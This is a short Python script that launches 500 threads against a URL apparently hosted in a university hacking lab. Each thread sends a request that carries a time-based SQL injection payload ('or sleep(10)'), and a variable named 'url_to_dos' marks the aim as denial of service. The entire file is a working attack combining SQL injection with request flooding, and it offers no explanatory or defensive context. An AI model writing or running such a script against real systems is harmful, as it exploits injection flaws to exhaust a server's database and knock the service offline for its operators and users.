import requests
from threading import Thread

url_to_dos="http://haklab-n1.cs.technikum-wien.at/sql/index.php?userid=1+or+sleep%2810%29+%23+"

def send_request(threadName):
    print(f"Thread: {threadName} requesting")
    r = requests.get(url_to_dos)
    print(f"Response: {r}")

for i in range (0, 500):
    thread = Thread(target=send_request, args=(f"Thread-{i}", ))
    thread.start()
